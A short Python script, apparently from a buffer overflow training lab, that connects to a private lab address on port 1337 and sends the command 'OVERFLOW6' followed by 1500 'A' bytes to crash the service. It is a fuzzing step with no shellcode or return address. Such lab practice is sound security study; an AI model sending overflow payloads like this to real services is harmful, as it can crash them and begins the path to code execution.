import socket, struct

host, port = "10.10.243.3", 1337

command = b'OVERFLOW6 '




payload = b''.join([
command,
b'A'*1500,
])


with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
